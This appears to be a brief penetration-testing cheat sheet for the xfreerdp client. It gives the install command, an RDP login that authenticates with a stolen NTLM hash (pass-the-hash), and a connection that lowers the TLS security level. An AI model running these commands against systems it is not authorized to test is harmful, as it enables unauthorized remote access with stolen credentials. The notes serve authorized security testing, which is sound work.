### Install
```
apt install freerdp2-x11
```

### RDP with pass the hash
```
xfreerdp /u:<user> /d:<domain> /pth:<hash> /v:<rhost> +clipboard /dynamic-resolution
```

### Connect using old cyphers and long timeout
```
xfreerdp /v:<rhost> /tls-seclevel:0 /timeout:80000
```

